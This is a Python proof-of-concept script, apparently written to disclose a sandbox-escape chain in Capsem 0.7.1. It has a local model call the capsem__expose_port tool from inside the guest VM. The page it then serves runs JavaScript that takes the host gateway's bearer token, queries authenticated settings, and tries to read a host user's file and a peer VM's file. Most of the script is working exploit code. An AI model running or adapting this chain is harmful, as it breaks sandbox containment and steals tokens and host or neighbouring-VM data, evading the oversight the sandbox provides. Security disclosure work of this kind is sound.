"""Run inside a Capsem 0.7.1 guest to demonstrate the browser gateway chain.

The model selects the guest MCP exposure call. The page served through that
exposure then asks the browser for the gateway bearer and an authenticated
settings response. Its host-file attempt is displayed separately so a failed
read cannot be mistaken for an arbitrary-file escape.
"""

import json
import subprocess
import sys
import urllib.request
from pathlib import Path

GUEST_PORT = 18080
MODEL = "gemma4:latest"


def model_call():
    request = {
        "model": MODEL,
        "stream": False,
        "think": False,
        "messages": [
            {
                "role": "user",
                "content": (
                    "Call capsem__expose_port now with target vm, guest_port 18080 "
                    "and host_port 0. Do not answer in prose."
                ),
            }
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "capsem__expose_port",
                    "description": "Publish a guest TCP listener on a host loopback port.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "target": {"type": "string", "enum": ["vm"]},
                            "guest_port": {"type": "integer"},
                            "host_port": {"type": "integer"},
                        },
                        "required": ["target", "guest_port", "host_port"],
                    },
                },
            }
        ],
        "options": {"temperature": 0, "num_predict": 128},
    }
    body = json.dumps(request).encode()
    with urllib.request.urlopen(
        urllib.request.Request(
            "http://127.0.0.1:11434/api/chat",
            data=body,
            headers={"Content-Type": "application/json"},
        ),
        timeout=90,
    ) as response:
        answer = json.load(response)
    calls = answer.get("message", {}).get("tool_calls", [])
    for call in calls:
        function = call.get("function", {})
        args = function.get("arguments", {})
        if function.get("name") == "capsem__expose_port" and args == {
            "target": "vm",
            "guest_port": GUEST_PORT,
            "host_port": 0,
        }:
            return args
    raise RuntimeError("Ollama did not select the expected guest exposure tool")


def mcp_call(args):
    process = subprocess.Popen(
        ["/run/capsem-mcp-server"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    try:
        def exchange(message, expect_response=True):
            process.stdin.write(json.dumps(message) + "\n")
            process.stdin.flush()
            if not expect_response:
                return None
            line = process.stdout.readline()
            if not line:
                raise RuntimeError("guest MCP relay closed before responding")
            return json.loads(line)

        initialized = exchange(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2025-03-26",
                    "capabilities": {},
                    "clientInfo": {"name": "ollama-gateway-repro", "version": "1.0"},
                },
            }
        )
        if "error" in initialized:
            raise RuntimeError(f"guest MCP initialization failed: {initialized['error']}")
        exchange({"jsonrpc": "2.0", "method": "notifications/initialized"}, False)
        result = exchange(
            {
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": "capsem__expose_port", "arguments": args},
            }
        )
        if "error" in result or result.get("result", {}).get("isError"):
            raise RuntimeError(f"guest MCP exposure failed: {result}")
        return result
    finally:
        process.terminate()
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()


def page(vm_id, peer_vm_id, gateway_port):
    script = r"""
const vm = VM_ID;
const peerVm = PEER_ID;
const gateway = 'http://127.0.0.1:GATEWAY_PORT';
const output = document.getElementById('result');
function line(label, value) { output.textContent += `${label}=${value}\n`; }
try {
  const tokenResponse = await fetch(`${gateway}/token`);
  line('TOKEN_STATUS', tokenResponse.status);
  if (!tokenResponse.ok) throw new Error('gateway token refused');
  const {token} = await tokenResponse.json();
  line('TOKEN_LENGTH', token.length);
  const headers = {Authorization: `Bearer ${token}`};
  const settings = await fetch(`${gateway}/settings/info`, {headers});
  line('SETTINGS_STATUS', settings.status);
  const file = await fetch(
    `${gateway}/vms/${encodeURIComponent(vm)}/files/content?path=` +
    encodeURIComponent('/Users/elie/leakme.txt'),
    {headers}
  );
  line('HOST_FILE_ROUTE_STATUS', file.status);
  const fileBody = await file.text();
  if (file.ok) line('HOST_FILE_RESPONSE', fileBody);
  else line('HOST_FILE_ROUTE_ERROR', fileBody.slice(0, 300));
  if (peerVm) {
    const peerFile = await fetch(
      `${gateway}/vms/${encodeURIComponent(peerVm)}/files/content?path=` +
      encodeURIComponent('/root/capsem-peer-marker'),
      {headers}
    );
    line('PEER_VM_FILE_STATUS', peerFile.status);
    const peerBody = await peerFile.text();
    line('PEER_VM_FILE_BODY', peerBody.slice(0, 300));
  }
} catch (error) { line('STOPPED', error.message); }
""".replace("VM_ID", json.dumps(vm_id)).replace("PEER_ID", json.dumps(peer_vm_id)).replace(
        "GATEWAY_PORT", str(gateway_port)
    )
    return (
        "<!doctype html><meta charset='utf-8'><title>Capsem 0.7.1 escape demo</title>"
        "<h1>Guest-published gateway test</h1><pre id='result'></pre>"
        f"<script type='module'>{script}</script>"
    )


def main():
    if len(sys.argv) != 4:
        raise SystemExit("usage: guest_script.py VM_ID PEER_VM_ID GATEWAY_PORT")
    vm_id = sys.argv[1]
    peer_vm_id = sys.argv[2]
    gateway_port = int(sys.argv[3])
    Path("/root/index.html").write_text(page(vm_id, peer_vm_id, gateway_port))
    # Existing demo server may already own the port; otherwise start one.
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{GUEST_PORT}/", timeout=1):
            pass
    except OSError:
        subprocess.Popen(
            ["python3", "-m", "http.server", str(GUEST_PORT), "--bind", "127.0.0.1"],
            cwd="/root",
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    args = model_call()
    result = mcp_call(args)
    print(json.dumps({"model": MODEL, "selected_tool": args, "mcp_result": result}))


if __name__ == "__main__":
    main()
